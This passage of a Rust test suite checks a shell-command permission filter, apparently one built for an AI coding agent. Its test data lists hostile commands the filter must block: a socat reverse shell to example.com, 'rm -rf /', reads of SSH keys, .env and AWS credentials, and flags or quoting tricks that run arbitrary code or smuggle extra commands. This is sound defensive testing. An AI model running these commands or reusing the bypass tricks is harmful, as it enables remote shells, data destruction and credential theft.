            ("/usr/bin/curl", "/usr/bin/curl -o .zshrc example.com"),
            ("./x", "./x --evil"),
            ("RM", "RM -rf /"),
            ("socat", "socat EXEC:sh TCP:example.com:80"),
            ("tar", "tar --to-command=./x -xf a.tar"),
            ("gcc", "gcc -wrapper ./x a.c"),
            ("then", "then rm -rf build"),
            ("do", "do rm -rf build"),
            ("cargo run", "cargo run --bin evil"),
            ("uv run", "uv run evil.py"),
            ("git fetch", "git fetch --upload-pack=./x origin"),
            ("git submodule", "git submodule foreach ./x"),
            ("git bisect", "git bisect run ./x"),
            ("make clean", "make clean SHELL=./x"),
        ] {
            for mode in [false, true] {
                assert!(!allows(line, mode, &[rule(saved, false)]), "{line}");
            }
        }
        // Rules for what's still plain keep working, and so do exact ones.
        assert!(allows(
            "pnpm run dev --port 1",
            false,
            &[rule("pnpm run dev", false)]
        ));
        assert!(allows(
            "git commit -m x",
            false,
            &[rule("git commit", false)]
        ));
        assert!(allows("make clean", false, &[rule("make clean", false)]));
        assert!(allows("cargo run", false, &[rule("cargo run", true)]));
        assert!(allows("/bin/rm a", false, &[rule("/bin/rm a", true)]));
    }

    #[test]
    fn saved_rules_match_the_line_they_came_from() {
        for line in [
            "git show 1a2b3c",
            "rm -rf 'my dir' && mv a b",
            "curl -s \"https://example.com/?q=a&b=c\"",
            "pnpm run dev",
            "find . -name '*.tmp' -delete",
            "echo 'single '\\'' quote'",
        ] {
            let rules = rules_for(line);
            assert!(!rules.is_empty(), "{line}");
            assert!(allows(line, false, &rules), "{line}: {rules:?}");
        }
    }

    /// The lines that pass in Auto or under `rules`, which should be none.
    fn passing<'a>(lines: &[&'a str], rules: &[CommandRule]) -> Vec<&'a str> {
        lines
            .iter()
            .copied()
            .filter(|line| allows(line, true, rules) || allows(line, false, rules))
            .collect()
    }

    #[test]
    fn a_word_the_shell_would_change_always_asks() {
        let lines = [
            r"echo $'a\'' ; touch MARK # '",
            r"ls $'a\'' ; rm -rf ~ # '",
            r"git status $'x\'' ; touch MARK # '",
            r"echo $'\''; touch M #'",
            "find . $'-delete'",
            "sort $'-o' out in",
            "git diff $'--output=x'",
            "find . ${X:--delete}",
            "sort ${X:--o} out in",
            "git diff ${X:---output=x}",
            "sed ${X:--i} s/a/b/ f",
            "find . {-delete,-name,x}",
            "sort {-o,out} in",
            "find . -[d]elete",
            "git diff --outpu[t]=x",
            "echo $HOME",
            r#"echo "$HOME""#,
            "git show HEAD@{1}",
            r"ls \",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        // Neither does a rule that names the command get them through.
        let rules = [
            rule("echo", false),
            rule("ls", false),
            rule("rg", false),
            rule("git status", false),
            rule("git show", false),
            rule("git diff", false),
            rule("find", false),
            rule("sort", false),
            rule("sed", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
        assert_eq!(split("find . ${X:--delete}"), Err(Refusal::Expansion));
        assert_eq!(split(r"ls \"), Err(Refusal::Unclosed));
        // A saved rule reads the line through the same lexer.
        let saved = [rule("git show", false)];
        assert!(!allows(r"git show $'\''; touch M #'", false, &saved));
        assert!(!allows(r"git show $'\''; touch M #'", true, &saved));
        // Single quotes, and a backslash, keep them literal.
        for line in [
            "rg 'foo$' src",
            "rg '[a-z]{2}' src",
            r"echo \$HOME",
            r#"echo "\$HOME""#,
            r"echo \{a\}",
            r"echo \[a",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_term_or_a_name_like_a_secret_doesnt_ask() {
        for line in [
            "git grep credentials",
            "git grep -n credentials src",
            "git grep -A 3 id_rsa src",
            "git grep -e credentials",
            "git log --grep=credentials",
            "git log --grep credentials",
            "git log --author=credentials",
            "git log -S id_rsa",
            "cargo test credentials",
            "cargo test -p maxd credentials",
            "npm test credentials",
            "pnpm test credentials",
            "pytest -k credentials",
            "pytest -k id_foo",
            "rg credentials src",
            "rg -n -A 3 credentials src",
            "grep -r credentials .",
            "find . -name credentials.json",
            "find . -iname id_rsa",
            "cat src/id_map.rs",
            "cat id_tools/a.rs",
            "cat credentials.rs",
            "sed -n '1,40p' crates/daemon/src/secrets/chatgpt/id_token.rs",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_real_key_name_asks_wherever_a_path_goes() {
        let lines = [
            "cat id_rsa",
            "cat id_ed25519",
            "cat id_ecdsa",
            "cat id_dsa",
            "cat id_rsa_work",
            "cat credentials",
            "cat credentials.json",
            "cat src/credentials",
            "cat .aws/credentials",
            "cat .env",
            "cat .env.example",
            "rg foo credentials",
            "rg -A 3 foo id_rsa",
            "git grep foo credentials",
            "git grep -f id_rsa",
            "git grep -n -f ~/.ssh/id_rsa src",
            "git grep -nf id_rsa",
            "grep -- -x id_rsa",
            "grep -- -A 3 id_rsa",
            "jq -C 3 id_rsa",
            "cargo test --config id_rsa",
            "cargo test --manifest-path id_rsa",
            "git log -- credentials",
            "git log --output=id_rsa",
            "cargo test ./credentials",
            "cargo test .env",
            "cargo test --manifest-path /tmp/x/Cargo.toml",
            "pytest credentials",
            "pytest -c id_rsa",
            "find credentials -name a",
            "find . -newer id_rsa",
            "go test ./credentials",
            "sed -n 1p id_rsa",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
    }

    #[test]
    fn a_change_stays_off_names_that_hold_secrets() {
        for path in [
            ".ssh/authorized_keys",
            ".ssh/config",
            ".aws/credentials",
            ".env",
            "id_rsa",
            "/work/ws/.ssh/config",
        ] {
            assert!(!folders().may_change(path), "{path}");
        }
        for path in ["src/main.rs", "src/id_map.rs", "credentials.rs"] {
            assert!(folders().may_change(path), "{path}");
        }
    }

    #[test]
    fn always_allow_holds_only_where_its_rules_cover_the_line() {
        for line in [
            "git status",
            "git show 1a2b3c && rm -rf build",
            "rm -rf build",
            "ls /tmp",
            "cat ~/.ssh/id_ed25519",
            "cd sub && ls",
        ] {
            assert!(always_allow_holds(line, &folders()), "{line}");
        }
        for line in [
            "cd /other/repo && git status",
            "rg foo src/*.rs",
            "tail -5 logs/*.log",
            "git diff -- src/*.rs",
            "echo $HOME",
            "git status; sudo rm x",
        ] {
            assert!(!always_allow_holds(line, &folders()), "{line}");
        }
    }

    #[test]
    fn double_quotes_keep_what_no_shell_expands_there() {
        // bash, zsh, dash and ksh each read these as these words.
        for (quoted, word) in [
            (r#""foo$""#, "foo$"),
            (r#""^foo$""#, "^foo$"),
            (r#""$""#, "$"),
            (r#""a$"b"#, "a$b"),
            (r#""a$"'b'"#, "a$b"),
            (r#""$""$""#, "$$"),
            (r#""foo[0-9]""#, "foo[0-9]"),
            (r#""fn main() {""#, "fn main() {"),
            (r#""a{2}""#, "a{2}"),
            (r#""{a,b}""#, "{a,b}"),
            (r#""}""#, "}"),
            (r#""[""#, "["),
            (r#""]""#, "]"),
            (r#""a*""#, "a*"),
            (r#""a?""#, "a?"),
            (r#""\{""#, r"\{"),
            (r#""foo\[0\]""#, r"foo\[0\]"),
            (r#""foo\$""#, "foo$"),
            (r#""foo\\$""#, r"foo\$"),
        ] {
            let line = format!("rg {quoted} src");
            assert_eq!(words(&line), [["rg", word, "src"]], "{line}");
            assert!(auto(&line), "{line}");
            assert!(allows(&line, false, &[rule("rg", false)]), "{line}");
            assert!(!allows(&line, false, &[]), "{line}");
        }
        for line in [
            r#"grep "^foo$" x"#,
            r#"git show "HEAD@{1}""#,
            r#"git log "@{u}..""#,
            r#"cat "app/[id]/page.tsx""#,
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn double_quotes_still_ask_about_what_the_shell_expands_there() {
        let lines = [
            r#"rg "$(id)""#,
            r#"rg "`id`""#,
            r#"rg "$HOME""#,
            r#"rg "${HOME}""#,
            r#"rg "$[1]""#,
            r#"rg "foo$ ""#,
            r#"rg "foo$\"""#,
            r#"rg "foo$"#,
            // A doubled backslash leaves what follows it live.
            r#"rg "a\\$(id)""#,
            r#"rg "a\\`id`""#,
            r#"rg "a\\$HOME""#,
            // What follows the closing quote is outside it.
            r#"rg "a$"$b"#,
            r#"rg "a$"`id`"#,
            r#"rg "a$"$(id)"#,
            r#"rg "a$"[0-9]"#,
            r#"rg "a"{b,c}"#,
            "rg foo[0-9] src",
            "rg foo{a,b} src",
            "rg foo$ src",
            "cat app/[id]/page.tsx",
            "git show HEAD@{1}",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        let rules = [
            rule("rg", false),
            rule("cat", false),
            rule("git show", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
    }

    #[test]
    fn a_backslash_in_double_quotes_keeps_what_follows_it_literal() {
        // Each shell prints these as written, so they don't run anything.
        assert_eq!(words(r#"rg "a\$(id)""#), [["rg", "a$(id)"]]);
        assert_eq!(words(r#"rg "a\`id\`""#), [["rg", "a`id`"]]);
        assert_eq!(words(r#"rg "a\$HOME""#), [["rg", "a$HOME"]]);
        assert!(auto(r#"rg "a\$(id)""#));
    }

    #[test]
    fn a_rule_in_double_quotes_names_only_those_words() {
        for (saved, same, others) in [
            (
                r#"rm "a[0-9]""#,
                "rm 'a[0-9]'",
                ["rm a[0-9]", r#"rm "$x""#, "rm a1"],
            ),
            (
                r#"rm "a{b,c}""#,
                "rm 'a{b,c}'",
                ["rm a{b,c}", r#"rm "$x""#, "rm ab"],
            ),
            (r#"rm "a$""#, "rm 'a$'", ["rm a$", r#"rm "a$x""#, "rm a"]),
        ] {
            let rules = [rule(saved, true)];
            assert!(allows(saved, false, &rules), "{saved}");
            assert!(allows(same, false, &rules), "{same}");
            for other in others {
                assert!(!allows(other, false, &rules), "{other}");
            }
            // What "Always allow" saves for it reads back as the same words.
            let offered = rules_for(saved);
            assert_eq!(offered.len(), 1, "{saved}");
            assert!(offered[0].exact, "{saved}");
            assert!(allows(saved, false, &offered), "{saved}");
            for other in others {
                assert!(!allows(other, false, &offered), "{other}");
            }
        }
        // A loose rule has no wildcards, so these words name only themselves.
        let loose = [rule(r#"git "{x}""#, false)];
        assert!(allows(r#"git "{x}""#, false, &loose));
        assert!(!allows("git x", false, &loose));
        assert!(!allows("git {x}", false, &loose));
        // A risky command still needs its exact words.
        assert!(!allows(r#"rm "a[0-9]""#, false, &[rule("rm", false)]));
    }

    #[test]
    fn quotes_read_the_way_the_shell_reads_them() {
        for line in [
            r#"g"i"t status"#,
            "g'i't status",
            r"g\it status",
            "echo x >/dev/null",
            "echo x 2>&1",
            "echo x >&2",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_sed_script_split_across_flags_asks() {
        for line in [
            r"sed -e 's/a/b\' -e '/;w out' f",
            "sed -e 's/a/b' f",
            "sed -e 'y/a/b' f",
            "sed -e '/a' -e '/;w out' f",
        ] {
            assert!(!auto(line), "{line}");
        }
        assert!(auto("sed -e '/a/p' -e 's/a/b/' f"));
    }

    #[test]
    fn a_flag_counts_however_its_tool_reads_it() {
        let lines = [
            "git diff --outp=path",
            "git log --outpu=path",
            "git grep --open-f='sh -c id' x",
            "git grep --open=./x needle",
            "git grep -nO x",
            "sort --outp=out in",
            "sort --outp=x a",
            "sort -ro out in",
            "uniq - out",
            "uniq - x",
            "uniq -- a b",
            "tree -ao out",
            "tree -ox",
            "tree -R",
            "rg --pr=./x y",
            "fd -xrm",
            "fd -xtouch",
            "fd -X./x",
            "date --se=x",
            "sed --in s/a/b/ x",
            "sed --file=evil.sed x",
            "sed -es/a/b/w x",
            "sed -l 5 x",
            "sed 's/a/b/;r /etc/passwd' x",
            r"sed 's\aw\b\c' x",
            r"sed '\,s,p;w out' x",
            "sed ':s;w out' x",
            "sed 'bs;w out' x",
            "printf -v x '%s' y",
            "tail -f x",
            "tail -F x",
            "tail --follow x",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        for line in lines {
            assert!(
                rules_for(line).iter().all(|rule| rule.exact),
                "{line}: {:?}",
                rules_for(line)
            );
        }
        // Names that only look alike stay as they were.
        for line in [
            "rg --pretty x",
            "git log --oneline -5",
            "git diff --no-ext-diff",
            "git show --no-textconv HEAD",
            "sort -r -u in.txt",
            "uniq -c in.txt",
            "tail -n 5 x",
            "sed -nE '1,5p' x",
            "sed -n -e 3p x",
            "sed -ne 3p x",
            r"sed ':a;N;$!ba;s/\n/ /g' x",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_flag_that_loads_or_runs_code_asks_under_a_rule_too() {
        for (line, command) in [
            ("git diff --ext-diff", "git diff"),
            ("git show --textconv", "git show"),
            ("git cat-file --filters x", "git cat-file"),
            ("git log --show-signature", "git log"),
            ("sort --compress-program=./x in", "sort"),
            ("sort -S 1K --compress-program=./x f", "sort"),
            ("jq -f evil x", "jq"),
            ("jq -L evil .", "jq"),
            (
                "rg --hostname-bin=./evil --hyperlink-format=default x",
                "rg",
            ),
            ("rg --hostname-bin=./x --hyperlink-format=default y", "rg"),
            ("file --compile -m x", "file"),
            (
                r#"cargo build --config 'build.rustc-wrapper="./x"'"#,
                "cargo build",
            ),
            ("cargo --config x test", "cargo"),
            ("go test -exec ./x", "go test"),
            ("go build -toolexec=./x", "go build"),
            ("go vet -vettool=./x", "go vet"),
            ("pytest -p evil", "pytest"),
            ("pytest -xp evil", "pytest"),
            ("pytest --override=x", "pytest"),
            ("npm test --script-shell=./evil", "npm test"),
            ("pnpm test --config.x=y", "pnpm test"),
            ("bun test -r ./evil", "bun test"),
        ] {
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule(command, false)]), "{line}");
            assert!(
                rules_for(line).iter().all(|rule| rule.exact),
                "{line}: {:?}",
                rules_for(line)
            );
        }
    }

    #[test]
    fn a_glob_asks_where_a_file_named_as_a_flag_could_do_harm() {
        for (line, command) in [
            ("find . *", "find"),
            ("sed -n 1p *", "sed"),
            ("git diff *", "git diff"),
            ("sort *", "sort"),
            ("sort ?.txt", "sort"),
            ("uniq *", "uniq"),
            ("rg foo *", "rg"),
            ("fd foo *", "fd"),
            ("tree *", "tree"),
            ("file *", "file"),
            ("jq . *", "jq"),
            ("tail -n 5 *.log", "tail"),
            ("date *", "date"),
            ("printf %s *", "printf"),
            ("cargo test *", "cargo test"),
            ("go test *", "go test"),
            ("pytest *", "pytest"),
            ("tsc --noEmit *", "tsc"),
            ("npm test *", "npm test"),
            ("pnpm test *", "pnpm test"),
        ] {
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule(command, false)]), "{line}");
            assert!(rules_for(line).is_empty(), "{line}");
        }
        // A file named as a flag can only change what these read or print.
        for line in [
            "ls *.md",
            "cat src/*.rs",
            "head -n 5 *.txt",
            "wc -l src/*.rs",
            "grep foo *.rs",
            "stat *.md",
            "du -sh *.md",
            "diff a.rs *.rs",
        ] {
            assert!(auto(line), "{line}");
        }
        // Quoted, these are just characters.
        for line in [
            "find . -name '*.rs'",
            r#"find . -name "*.rs""#,
            r"find . -name \*.rs",
            "git log --grep '?'",
            "sort 'a*'",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn ordinary_lines_still_pass() {
        for line in [
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1",
            "ls -la",
            "rg foo src",
            "cargo check",
            "cat README.md",
            "grep -r foo .",
            "cargo test",
            "npm test",
            "pnpm test",
            "pytest",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_rule_that_does_not_read_as_one_command_matches_nothing() {
        let rules = [rule("ls && rm x", false), rule("echo $(x)", true)];
        assert!(!allows("ls", false, &rules));
        assert!(!allows("echo hi", false, &rules));
    }
}
